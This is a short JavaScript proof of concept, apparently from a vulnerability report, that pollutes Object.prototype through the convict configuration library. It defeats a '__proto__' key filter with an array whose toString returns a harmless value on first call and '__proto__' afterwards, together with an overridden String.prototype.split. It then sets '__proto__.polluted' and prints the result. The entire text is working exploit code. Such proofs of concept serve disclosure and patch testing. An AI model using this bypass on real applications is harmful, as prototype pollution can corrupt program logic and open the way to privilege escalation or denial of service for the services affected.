var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('__proto__.polluted', 'yes');
console.log({}.polluted);